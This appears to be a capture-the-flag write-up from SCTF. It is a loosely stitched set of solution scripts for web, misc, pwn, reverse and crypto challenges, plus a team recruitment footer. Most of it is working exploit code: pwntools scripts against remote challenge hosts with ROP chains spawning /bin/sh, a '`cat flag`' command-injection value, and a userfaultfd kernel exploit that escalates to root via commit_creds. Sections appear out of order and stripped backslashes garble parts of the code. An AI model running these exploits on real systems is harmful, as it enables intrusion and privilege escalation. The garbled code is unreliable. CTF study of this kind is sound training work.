  var file = req.query.f;

  file = file.replace(/..//g, '');
  rootpath = rootpath.replace(/..//g, '');

  if(rootpath === ''){
    if(file === ''){
      return res.status(500).send('try to find parameters HaHa');
    } else {
      rootpath = "static"
    }
  }

  const filePath = path.join(__dirname, rootpath + "/" + file);

  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }
  fs.readFile(filePath, (err, fileData) => {
    if (err) {
      console.error('Error reading file:', err);
      return res.status(500).send('Error reading file');
    }

    zlib.gzip(fileData, (err, compressedData) => {
      if (err) {
        console.error('Error compressing file:', err);
        return res.status(500).send('Error compressing file');
      }
      const base64Data = compressedData.toString('base64');
      res.send(base64Data);
    });
  });
});

app.get("/report", verifyAdmin ,(req, res) => {
  res.sendFile(__dirname + "/static/report_noway_dirsearch.html");
});

app.post("/report", verifyAdmin ,(req, res) => {
  const {user, date, reportmessage} = req.body;
  if(Reportcache[user] === undefined) {
    Reportcache[user] = {};
  }
  Reportcache[user][date] = reportmessage
  res.status(200).send("<script>alert('Report Success');window.location.href='/report'</script>");
});

app.get('/countreport', (req, res) => {
  let count = 0;
  for (const user in Reportcache) {
    count += Object.keys(Reportcache[user]).length;
  }
  res.json({ count });
});

//查看当前运行用户
app.get("/VanZY_s_T3st", (req, res) => {
  var command = 'whoami';
  const cmd = cp.spawn(command ,[]);
  cmd.stdout.on('data', (data) => {
    res.status(200).end(data.toString());
  });
})

app.listen(3000, () => {
  console.log('Server running on http://localhost:
3000');
});

java解密脚本

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

public class Test {
    public static void main(String[] args) throws Exception {
        String str = "H4sIAAAAAAAAA/PLVwhKTrX3VEhOzFMvUXDPLEtViMwvVXDLSUxXcCrK5wIAJvPeCSEAAAA=";
        byte[] decode = Base64.getDecoder().decode(str);
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(decode));
        byte[] buffer = new byte[256];
        int n;
        while ((n = gzipInputStream.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        System.out.println(new String(out.toByteArray()));
    }
}

package.json

{
  "dependencies": {
    "body-parser": "^1.20.3",
    "cookie-parser": "^1.4.6",
    "crypto": "^1.0.1",
    "express": "^4.21.0",
    "jsonwebtoken": "^9.0.2",
    "mysql": "^2.18.1",
    "node-rsa": "^1.1.1",
    "path": "^0.12.7",
    "require-in-the-middle": "^7.4.0"
  }
}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Report Submission</title>

    
</head>

<h1>Submit a Report</h1>


    
        Current number of reports: Loading...
    

    <form action="/report" method="POST">
        
            <label for="user">User:</label>
            
        

        

        
            <label for="reportmessage">Report Message:</label>
            <textarea id="reportmessage" name="reportmessage" rows="6" required></textarea>
        

        Submit Report
    </form>


<script>
    window.onload = function() {
        // 获取当前日期并填入隐藏字段
        const today = new Date();
        const year = today.getFullYear();
        const month = String(today.getMonth() + 1).padStart(2, '0');
        const day = String(today.getDate()).padStart(2, '0');
        const formattedDate = `${year}${month}${day}`;
        document.getElementById('date').value = formattedDate;

        // 请求当前报告数量并更新显示
        fetch('/countreport')
            .then(response => response.json())
            .then(data => {
                document.getElementById('report-count').textContent = data.count;
            })
            .catch(error => {
                console.error('Error fetching report count:', error);
                document.getElementById('report-count').textContent = 'Error';
            });
    };
</script>

</html>

/static/report_noway_dirsearch.html文件

启动环境

docker run -itd –name mysql-test -p 3306:
3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:8.0.19

Misc

速来探索SCTF星球隐藏的秘密！

根据要求试输入 不对会回显really 最后测出完整的是HAHAHAy04

给了个ai链接

调教就出了 最后根据题目描述拼起来就是flag

Fixlt

给的style.txt是css内容 加上个html头尾补成html文件渲染一下

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>像素图渲染</title>
    
</head>

    
        
    

</html>

打开之后鼠标放上去图案会动 是AZTEC码

简单处理一下 把灰色部分和小间隔部分涂黑 找到网站扫一下出flag

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:
222328705

星盟安全团队纳新群2:
346014666

有兴趣的师傅欢迎一起来讨论!

PS:
团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@Elite


```
.text:
00000000004DA910 show_user proc near ; CODE XREF: _cgo_22187f6e70a4_Cfunc_show_user+7↓j
.text:
00000000004DA910 ; DATA XREF: LOAD:
0000000000400B78↑o
.text:
00000000004DA910 ; __unwind {
.text:
00000000004DA910 endbr64
.text:
00000000004DA914 push rbx ; s
.text:
00000000004DA915 call find_user
.text:
00000000004DA91A test rax, rax
.text:
00000000004DA91D jz short loc_4DA980
.text:
00000000004DA91F cmp qword ptr [rax+100h], 0
.text:
00000000004DA927 mov rbx, rax
.text:
00000000004DA92A jz short loc_4DA960
.text:
00000000004DA92C
.text:
00000000004DA92C loc_4DA92C: ; CODE XREF: show_user+66↓j
.text:
00000000004DA92C lea rdi, aUserContent ; "user content:n"
.text:
00000000004DA933 call puts
.text:
00000000004DA938 mov edx, [rbx+10Ch]
.text:
00000000004DA93E mov rsi, [rbx+100h]
.text:
00000000004DA945 xor eax, eax
.text:
00000000004DA947 mov edi, 1
.text:
00000000004DA94C call _write
.text:
00000000004DA951 lea rdi, aShowUserConten ; "show user content success"
.text:
00000000004DA958 pop rbx
.text:
00000000004DA959 jmp puts
#!/usr/bin/env python3
# -*- coding:
utf-8 -*-

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')

sh = None
count = 0
while count < 16:
    count += 1
    sh = remote('1.95.70.149', 80)
    
    for i in range(9):
        sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":0,"content":"' + base64.b64encode(str(i).encode()*8) + b'","username":"' + base64.b64encode(b'uuuu' + str(i).encode()*4) + b'","size":64}]')

    sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":3,"content":"' + base64.b64encode(b'unused') + b'","username":"' + base64.b64encode(b'unused') + b'","size":64}]')
    sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":1,"content":"' + base64.b64encode(b'unused') + b'","username":"' + base64.b64encode(b'uuuu8888') + b'","size":64}]')

    sh.recvuntil(b'content:nn')
    sh.recvn(8)
    heap_addr = u64(sh.recvn(8))
    success('heap_addr: ' + hex(heap_addr))
    sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":2,"content":"' + base64.b64encode(b'unused') + b'","username":"' + base64.b64encode(b'uuuu0000') + b'","size":64}]')
    sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":0,"content":"' + base64.b64encode(p64(heap_addr+0xff0-0x20)) + b'","username":"' + base64.b64encode(b'dddd1111') + b'","size":64}]')
    sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":0,"content":"' + base64.b64encode(b'unused') + b'","username":"' + base64.b64encode(b'dddd2222') + b'","size":64}]')
    sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":0,"content":"' + base64.b64encode(b' ' * 0x10 + p64(0x5E0FD8) + p64(0x4000000001)) + b'","username":"' + base64.b64encode(b'dddd3333') + b'","size":64}]')

    sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":1,"content":"' + base64.b64encode(b'unused') + b'","username":"' + base64.b64encode(b'dddd1111') + b'","size":64}]')
    sh.recvuntil(b'content:nn')
    puts_addr = u64(sh.recvn(8))
    if (puts_addr & 0xfff) == 0x420:
        break
    else:
        sh.close()

success('puts_addr: ' + hex(puts_addr))
sh.sendlineafter(b'Please input your tasksn', b'[{"task_type":-1,"content":"' + base64.b64encode(b'`cat flag`') + b'","username":"' + base64.b64encode(hex(puts_addr).encode() + b' ') + b'","size":64}]')

sh.interactive()
from pwn import *
from LibcSearcher import *
import ctypes
from struct import pack
import numpy as np
from ctypes import *
from math import log
import warnings
banary = "./pwn"
elf = ELF(banary)
    #libc = ELF("./libc.so.6")
    #libc=ELF("/home/berial/libc/64bit/libc-2.27.so")
    #libc=ELF("/home/berial/libc/64bit/libc-2.23.so")
    #libc=ELF("/home/berial/libc/32bit/libc-2.27.so")
    #libc=ELF("/home/berial/libc/32bit/libc-2.23.so")
    #libc=ELF("/home/berial/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so")
    #libc=ELF("/home/berial/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
    #libc=ELF("/home/berial/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so")
warnings.filterwarnings("ignore", category=BytesWarning)
context(log_level = 'debug', os = 'linux', arch = 'amd64')
    #context(log_level = 'debug', os = 'linux', arch = 'i386')

def debug(a=''):
    if a != '':
        gdb.attach(io, a)
        pause()
    else:
        gdb.attach(io)
        pause()
def cal(x, y):
    return ((x - y) + 0x10000) % 0x10000
def get_sb():
    return base + libc.sym['system'], base + next(libc.search(b'/bin/shx00'))
#----------------------------------------------------------------
s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
rud = lambda text: io.recvuntil(text, drop=True)
rl = lambda : io.recvline()
uu32 = lambda : u32(io.recvuntil(b"xf7")[-4:].ljust(4, b'x00'))
uu64 = lambda : u64(io.recvuntil(b"x7f")[-6:].ljust(8, b"x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(6),16)
uheap = lambda : u64(io.recv(6).ljust(8,b'x00'))
lg = lambda addr : log.info(addr)
ia = lambda : io.interactive()
lss = lambda s :
log.success(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
p = lambda s: print(' 33[1;31;40m%s --> 0x%x  33[0m' % (s, eval(s)))
#----------------------------------------------------------------
url = '1.95.68.23:
58924'
local = 0
if local:
    io = process(banary)
    #io = process(banary, env={LD_LIBRARY:'./libc.so'})
    #io = process(banary,stdin=PTY,raw=False)
else:
    io = remote(*url.replace(':', ' ').split())
#----------------------------------------------------------------
script = '''
    b *$rebase(0x122a)
    '''
# gdb.attach(io, script)
# ----------------------------------------------------------------
# offset
# 0x555555556020 <offset>:  0x003a 0x005f 0x006d 0x008a 0x00a6 0x00c2 0x00df 0x00f4
# 0x555555556030 <offset+16>:   0x00f8 0x010e 0x0122 0x0138 0x0169 0x0186 0x01a3 0x01c0
# 0x555555556040 <offset+32>:   0x01eb 0x01ff 0x0218 0x0000 0x0000 0x0000 0x0000 0x0000
# 0x555555556050 <offset+48>:   0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000
# 0x555555556060 <offset+64>:   0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000 0x0000

# code
# 0x652b443f3040 <code>:    0x26   0x6c   0x63   0x6f   0x64   0x2b   0x2b   0x2b
# 0x652b443f3048 <code+8>:  0x2b   0x26   0x73   0x68   0x65   0x6c   0x23   0x31
# 0x652b443f3050 <code+10>: 0x26   0x65   0x3a   0x20   0x00   0x25   0x26   0x0b
# 0x652b443f3058 <code+18>: 0x00   0x00   0x00   0x25   0x26   0x01   0x00   0x00
# 0x652b443f3060 <code+20>: 0x00   0x26   0x01   0x00   0x00   0x00   0x30cal    0x28pop3次
# 0x652b443f3068 <code+28>: 0x28   0x28   0x26   0x50   0x00   0x00   0x00   0x32
# 0x652b443f3070 <code+30>: 0x26   0xf1   0x00   0x00   0x00   0x23   0x26   0x00
# 0x652b443f3078 <code+38>: 0x00   0x00   0x00   0x26   0x00   0x00   0x00   0x00

pay = flat([0x26, b'flag', 0x31, 0x26,p32(0), 0x25, 0x26, p32(0), 0x25, 0x26, p32(2), 0x30, 0x28] ,word_size=8)
pay += flat([0x31, 0x26,p32(0), 0x25, 0x26,p32(0), 0x25, 0x26,p32(0), 0x25, 0x26,p32(0), 0x25, 0x2a, 0x26,p32(0x30), 0x25,  0x26,p32(3), 0x26, p32(0), 0x30], word_size=8)
pay += flat([0x25, 0x26, p32(1), 0x26, p32(1), 0x30], word_size=8)
sa(b'shellcode', pay)

    #debug()
ia()
    #include <stdlib.h>
    #include <fcntl.h>
    #include 
    #include <stdio.h>
    #include <sys/ioctl.h>
    #include <sys/mman.h>
    #include <string.h>
    #include <syscall.h>
    #include <linux/userfaultfd.h>
    #include 
    #include 
    #define TTY_STRUCT_MAGIC 0x0000000100005401
/*
>>> hex(base - libc.sym['commit_creds'])
'-0x97d00'
>>> hex(base - libc.sym['prepare_kernel_cred'])
'-0x98140'

0x572fb3: push qword ptr [rcx + rdx + 0x31]; rcr byte ptr [rbx + 0x5d], 0x41; pop rsp; ret; 
0x003e98: pop rdi; ret; 
0x0035a6: pop rbx; ret;
0x34e90e: mov rdi, rax; test rbx, rbx; jg 0x34f900; mov rax, rdi; pop rbx; ret; 
0x5c8f0: swapgs; ret; 
0x32b42: iretq; ret; 
*/
size_t kernel_base;

int fd;
char check_buf[0x30];
char data[0x400];
int ptmx[0x100];
long ptr;
size_t user_cs, user_ss, user_rflags, user_rsp;
void save_status()
{
        __asm__(".intel_syntax noprefix;"
                "mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_rsp, rsp;"
                "pushf;"
                "pop user_rflags;"
                ".att_syntax;");
        puts(" 33[32m[+]save status successfully 33[0m");
}

void shell() {
    system("/bin/sh");
    return;
}

char data[0x400],checkbuf[0x30];
int ptmx[0x100];
int fd;
long ptr;
size_t kernel_base;

void Handler(int uffd) {
    size_t commit_creds = kernel_base + 0x97d00;
    size_t prepare_kernel_cred = kernel_base + 0x98140;
    size_t pop_rop_31_to_rsp = kernel_base + 0x572fb3;
    size_t pop_rdi = kernel_base + 0x003e98;
    size_t pop_rbx = kernel_base + 0x35a6;
    size_t mov_rdi_rax_test_rbx_rbx_jg_0x34f900_mov_rax_rdi_pop_rbx = kernel_base + 0x34e90e;
    size_t swapgs = kernel_base + 0x5c8f0;
    size_t iretq = kernel_base + 0x32b42;
    struct uffd_msg msg;
    struct uffdio_copy uc = { 0 };
    unsigned long* faketty = (unsigned long*)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    int idx = 0x20;
    while(1){
        struct pollfd pf = { 0 };
        pf.fd = uffd;
        pf.events = POLLIN;
        poll(&pf, 1, -1);
        read(uffd, &msg, sizeof(msg));
        if (msg.event <= 0) {
            continue;
        }
        faketty[0] = TTY_STRUCT_MAGIC;
        faketty[2] = ptr;
        faketty[3] = ptr;
        *(long*)(((char*)faketty) + 0x31) = ptr+0x100;
        faketty[12] = pop_rop_31_to_rsp;
        faketty[idx++] = pop_rdi;
        faketty[idx++] = 0;
        faketty[idx++] = prepare_kernel_cred;
        faketty[idx++] = pop_rbx;
        faketty[idx++] = 0;
        faketty[idx++] = mov_rdi_rax_test_rbx_rbx_jg_0x34f900_mov_rax_rdi_pop_rbx;
        faketty[idx++] = 0;
        faketty[idx++] = commit_creds;
        faketty[idx++] = swapgs;
        faketty[idx++] = iretq;
        faketty[idx++] = (unsigned long long)shell;
        faketty[idx++] = user_cs;
        faketty[idx++] = user_rflags;
        faketty[idx++] = user_rsp;
        faketty[idx++] = user_ss;
        *(long*)&checkbuf[0x58 - 0x30] = 0;
        ioctl(fd, 0xFFF1, checkbuf);
        for (int i = 0; i < 0x50; i++) {
            ptmx[i] = open("/dev/ptmx", O_RDWR);
        }
        uc.src = (unsigned long)faketty;
        uc.dst = msg.arg.pagefault.address & ~(getpagesize() - 1);
        uc.len = getpagesize();
        uc.mode = 0;
        uc.copy = 0;
        ioctl(uffd, UFFDIO_COPY, &uc);
        break;
    }
}
void* page;
void userfaultfd(){
    page = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    struct uffdio_register ur = { 0 };
    struct uffdio_api ua = { 0 };
    ur.range.start = (unsigned long)page;
    ur.range.len = 0x1000;
    ur.mode = UFFDIO_REGISTER_MODE_MISSING;
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        return 1;
    ioctl(uffd, UFFDIO_REGISTER, &ur);
    pthread_t pt;
    pthread_create(&pt, NULL, (void* (*)(void*))Handler, (void*)uffd);
}

int main() {
    save_status();
    fd = open("/dev/ksctf", O_RDWR);
    //leak kernelbase
    int note = open("/sys/kernel/notes", O_RDONLY);
    char tmp[0x100] = { 0 };
    read(note, tmp, 0x100);
    kernel_base = *(long*)(&tmp[0x9c]) - 0x2000;
    checkbuf[0x20] = 1;
    *(long*)&checkbuf[0x28] = (long)data;
    //userfauld
    userfaultfd();
    ioctl(fd, 0xFFF0, checkbuf);
    ptr = *(long*)data;
    write(fd, page, 0x2e0);
    for (int i = 0; i < 0x50; i++) {
         ioctl(ptmx[i], 0, ptr);
    }
    return 0;
}
pop_rdi = 0x0000000000401ebf
pop_rsi = 0x0000000000409f2e
pop_rdx_rbx = 0x000000000047ed6b
pop_rax = 0x0000000000447be7
syscall = 0x00000000004145e5
binsh = 0x00000000004980ff

payload = p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(pop_rdx_rbx) + p64(0) + p64(0) + p64(syscall)
# xbfx1ex40x00x00x00x00x00
# xffx80x49x00x00x00x00x00
# x2ex9fx40x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x6bxedx47x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# xe7x7bx44x00x00x00x00x00
# x3bx00x00x00x00x00x00x00
# x74x1cx40x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00
# x00x00x00x00x00x00x00x00

sh = '''
package main

func pad() string{
    return "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
}
func shell() string {
    return "/bin/sh"
}
func main() {
    var a string = pad()
    a = "aaaaaaaaxbfx1ex40x00x00x00x00x00xffx80x49x00x00x00x00x00x2ex9fx40x00x00x00x00x00x00x00x00x00x00x00x00x00x6bxedx47x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00xe7x7bx44x00x00x00x00x00x3bx00x00x00x00x00x00x00xe5x45x41x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00"
    return 0
}
'''
from pwn import *      
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './factory'
    #io=process(pwnfile)
io=remote('1.95.81.93',57777)
elf = ELF(pwnfile)          
libc = ELF("./libc.so.6")
  
def debug():
    gdb.attach(io)
    pause()

pay = b'40'
io.sendlineafter("do you want to build:",pay)
for i in range(22):
    io.sendlineafter(" = ",b'1')
io.sendlineafter(" = ",b'28')
#------------------------------------
pop_rdi = 0x0000000000401563
ret = 0x40148E
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

io.sendlineafter(" = ",str(pop_rdi))
io.sendlineafter(" = ",str(puts_got))
io.sendlineafter(" = ",str(puts_plt))
io.sendlineafter(" = ",str(0x040148F))

    #debug()
for i in range(7):
    io.sendlineafter(" = ",b'0')

puts_adr = u64(io.recvuntil("x7f")[-6:].ljust(8,b'x00'))
libc_base = puts_adr-libc.sym['puts']
sys_adr=libc_base+libc.sym['system']
bin_sh = libc_base + libc.search(b'/bin/sh').__next__()
print("libc_base------>",hex(libc_base))

#-----------------------------------------------
io.sendlineafter("do you want to build:",pay)
for i in range(22):
    io.sendlineafter(" = ",b'1')
io.sendlineafter(" = ",b'28')

io.sendlineafter(" = ",str(pop_rdi))
io.sendlineafter(" = ",str(bin_sh))
io.sendlineafter(" = ",str(ret))
io.sendlineafter(" = ",str(sys_adr))

for i in range(6):
    io.sendlineafter(" = ",b'0')
    #debug()
io.sendlineafter(" = ",b'0')

io.interactive()
    #include <stdio.h>
    #include <stdint.h>  

int  sub_810004C(char* a1)
{
    uint8_t* v3; // r4
    char v4 = 0; // r2
    char v5 = 0; // t1
    char v6 = 0; // r3
    char v7 = 0; // t1
    char v8 = 0; // r2
    char v9 = 0; // t1
    char v10 = 0; // t1
    int count = 404;
    int index = 0;
    int index1 = 0;
    uint8_t a2[405] = { 0 };
    do
    {
        v5 = a1[index++];
        v4 = v5;
        v6 = v5 & 0xF;
        if ((v5 & 0xF) == 0)
        {
            v7 = a1[index++];
            v6 = v7;
        }
        v8 = v4 >> 4;
        if (!v8)
        {
            v9 = a1[index++];
            v8 = v9;
        }
        while (--v6)
        {
            v10 = a1[index++];
            a2[index1++] = v10;
        }
        while (--v8)
            a2[index1++] = 0;   
    } while (index1 < 404);

    for (int i = 0; i < 404; i++)
    {
        printf("%d ", a2[i]);
    }
    return 0;
}

int main() {

    char a1[40] = { 1, 19, 2, 150, 136, 0, 18, 176, 20, 166, 145, 254, 185, 215, 65, 175, 130, 204, 78, 233, 71, 71, 40, 79, 209, 66, 16, 82, 1, 88, 144, 208, 3, 0, 144, 208, 3, 2, 24, 1 };

    sub_810004C(a1);

    return 0;
}
    #include <stdio.h>  
    #include <string.h>  
    #include <stdint.h>  

unsigned int* __fastcall sub_8104CA8_1(uint32_t* result, uint32_t* a2)
{
    unsigned int v2; // r2
    unsigned int v3; // r3
    unsigned int v4; // r4
    unsigned int i; // r5

    v2 = *result;
    v3 = result[1];
    v4 = 0;

    for (i = 0; i < 0x20; ++i)
    {
        v4 -= 0x61C88647;
        v2 += (*a2 + 16 * v3) ^ (v3 + v4) ^ (a2[1] + (v3 >> 5));
        v3 += (a2[2] + 16 * v2) ^ (v2 + v4) ^ (a2[3] + (v2 >> 5));
    }
    *result = v2;
    result[1] = v3;
    return result;
}

int main() {

    //604a8a6e 9dacb167
    uint32_t key[4] = { 0x0123,0x4567,0x89AB,0xCDEF };
    uint32_t enc[2] = { 0x11223344,0x55667788 };
    sub_8104CA8_1(enc, key);
    printf("%x %x", enc[0], enc[1]);
    return 0;
}
from Crypto.Cipher import ARC4
enc =[20,166, 145, 254, 185 ,215, 65 ,175 ,130 ,204 ,78 ,233 ,71 ,71 ,40 ,79, 209]

key = [0x60,0x4a,0x8a,0x6e,0x9d,0xac,0xb1,0x67]

rc4 = ARC4.new(bytes(key))
data = rc4.decrypt(bytes(enc))
print(data)
import base64
from Crypto.Util.number import *
key = b"S0C0Z0Y0W"
basedecode_enc = base64.b64decode("YgNxAGMDawJjZQR6B2IGYANiYQVxAG8JYQhkawZ3AW8JagluYAN2Am4GbQRmZAR6AWwBbQNlZANxCWsCaAlhZQRxAm4CbgRkZgl1AWIIawhmYAh3B2MBaAJmaghwAWoEbwliYgBwCWkIbQNuawlyAW0FYAhuYgB1Am8CawRuYAJxCG8CbgRgZAF3BWgJYQlhZwFzAGsJbwFlagV0CW0FawhgawNyCGkAbQNjYQh3Bm4FbwNkYAJ6A2IDaANmYwl2A2sEaQRlaglyAm0HaARmYQZ7AWsIbwZhYwB0B2sIYAlvYgN2AWsHYQJiZAByAGgDYANmYQB0BmwJYABhZwl1CGkEaQlmZQJzBm0IYQdjYwh6A20BbwVhZQl3CGoIaABmYAN1AW0IbQFvYAN0B2gFYAVhZAF1BW8HYQZvagZ6A20CaAhjZAl6BWkCYQhvZAN1AGgDaQJhYQZzCW8BYABjZAN0AW8BbQViZwVyA28JagJiagd1CGgDawhvYQJwB28GagNvYwd6AG0BYQFuawVyBGoBaQFkZAV1A24HbgdlYgd1AWwIYQNkagV6BW0DbglvZAl0A2kFaAhjawB3AmwAbwZgZwV3BGMEaQllYAhzAGsEYAFhYAJ6Bm4GaQdkagl6A20DawdkZgd3BW0JbgRgYQZyB2kJbANnZgdwA2gFaQFnYAh7BW4GbAdhYgd7Bm4DawJmawN0CWMDbgJgYwh0AmwGYQRiYQN2BmIGaAVkYwh2BmsDbAFhaglzB2kAbQBjZwJ1BGkCaghiZgByAWkJaAhhagZ3AG0JaghiYQVwAmMIaAFjYgVzBGh0dHA6Ly80Ny4xMDkuMTA2LjYyOjkwOTB7Im5hbWUiOiJTQ1RGIiwicGFzc3dvcmQiOiI4ODg4ODg4OCJ9")

str_index = basedecode_enc.index(b"http")
basedecode_enc = bytearray(basedecode_enc[:
str_index])

for i in range(len(basedecode_enc)):
    basedecode_enc[i] ^= key[i % len(key)]

str_all = "10669721913248017310606431714870563867652912174255756" + "77708576877293974468987904515774877239910831730102424168632380997160447756586819818214079227220527789589428918310335" + "12463262741053961681512908218003840408526915629689432111480588966800949428079015682624591636010678691927285321708935" + "07622195117342689483616914481942446584230780635367254734412529071675353523965841788382894123250962283869276191721180" + "69630111688222816660336951574265158642655270462133261451743980188590564394314228679570791499675920788944100826957141" + "60599647180947207504108618794637872261572262805565517756922288320779308895819726074229154002310375209"
str_1 = "144819424465842307806353672547344125290716753535239658417883828941232509622838692761917211806963011168822281666033695157426515864265527046213326145174398018859056439431422867957079149967592078894410082695714160599647180947207504108618794637872261572262805565517756922288320779308895819726074229154002310375209"

p = int(str_all[str_all.index(str_1):])
q = int(str_all[:
str_all.index(str_1)])
e = 65537
n = p * q
f = (p - 1) * (q - 1)
d = inverse(e,f)
c = int(basedecode_enc.decode())
m = str(pow(c,d,n))

enc2 = m.replace("00"," ").split(" ")[:-1]
flag = ""
for i in enc2:
    flag += chr(int(i))

index = "gahbicjdlemfn"
table = "abcdefghijlmn"

for i in range(len(flag)):
    print(flag[index.index(table[i])],end="")
    #include<stdio.h>

int main()

{

    unsigned int rand_list[]={1227918265,3978157,263514239,1969574147,1833982879,488658959,231688945,1043863911,1421669753,1942003127,1343955001,461983965,602354579,726141576,1746455982,1641023978,1153484208,945487677,1559964282,1484758023,360805106,1295207561,808154853,1578628148,1764616483,134664533,1026318808,487190350,2084406199,494281178,767599596,1164840817,498259336,1031113836,986931316,184758567,1519772795,1218620261,1228622478,793958901};

    for(int i=0;i<40;i++){

        printf("%x,",rand_list[i]);

    }

    printf("n");

    unsigned char ida_chars[] =

{

  0x33, 0xC0, 0xC8, 0xA3, 0xF3, 0xBF, 0x1D, 0x1A, 0x3B, 0x41,

  0xB7, 0xC6, 0xF1, 0x5E, 0x86, 0x52, 0x52, 0xCF, 0x6B, 0x1E,

  0xC5, 0xF9, 0xCB, 0xBF, 0xED, 0x7B, 0x62, 0xF1, 0xF7, 0x43,

  0x48, 0x54, 0xFB, 0x85, 0x4C, 0xD9, 0x35, 0x30, 0xF2, 0x6E

};

  

    for(int i=0;i<10;i++){

        unsigned int target1=*((unsigned int*)(ida_chars+4*i));

        printf("%xn",target1);

        for(int i=0;i<32;i++){

            if((target1<<31)>>31){

                target1=target1^0x85B6874F;

                target1=target1/2;

                target1=target1|0x80000000;

            }

            else{

                target1=target1/2;

            }

        }

        *((unsigned int*)(ida_chars+4*i))=target1;

    }

    printf("n");

    printf("==========================n");

    for(int i=0;i<40;i++){
        printf("%x,",ida_chars[i]);
    }
    printf("n");

    for(int i=0;i<40;i++){
        printf("%c",0x1f^(ida_chars[i]^(rand_list[i]&0xff)));
    }

    printf("n");

    short f415short[] =  {2946, 2947, 2972, 2973, 2974, 2975, 2968, 2984, 2985, 2986, 2987, 2980, 2981, 2982, 2983, 2976, 2948, 2949, 2950, 2951, 2944, 3001, 3002, 3005, 3006, 3007, 3000, 3011, 3003, 2996, 2997, 2998, 2957, 2958, 2989, 2990, 2991, 2959, 2952, 2953, 2954, 2955, 2945, 2969, 2970, 3034, 3035, 3028, 3029, 3015, 2971, 2964, 2965, 2966, 3036, 3037, 3038, 3039, 3032, 3033, 2977, 2978, 2979, 3004};

    for(int i=0;i<64;i++)
    {
        f415short[i]^=3052;
        printf("%c",f415short[i]);
    }

    printf("n");
}
# sage 10.3
from Crypto.Util.number import *
from hashlib import md5

def get_d(e,n):
    cf = continued_fraction(e / n^2)
    for i in range(1,1000):
        k = cf.numerator(i)
        d = cf.denominator(i)
        if (e*d - 1) % k == 0 and d != 3:
            phi = (e*d - 1) // k
            print(f"d = {d}")
            print(f"phi = {phi}")
            return d,phi
        
N = 32261421478213846055712670966502489204755328170115455046538351164751104619671102517649635534043658087736634695616391757439732095084483689790126957681118278054587893972547230081514687941476504846573346232349396528794022902849402462140720882761797608629678538971832857107919821058604542569600500431547986211951
e = 334450817132213889699916301332076676907807495738301743367532551341259554597455532787632746522806063413194057583998858669641413549469205803510032623432057274574904024415310727712701532706683404590321555542304471243731711502894688623443411522742837178384157350652336133957839779184278283984964616921311020965540513988059163842300284809747927188585982778365798558959611785248767075169464495691092816641600277394649073668575637386621433598176627864284154484501969887686377152288296838258930293614942020655916701799531971307171423974651394156780269830631029915305188230547099840604668445612429756706738202411074392821840

d,phi = get_d(e,N)
p,q = var('p,q')

f1 = p*q - N
f2 = (p^2 + p + 1)*(q^2 + q + 1) - phi

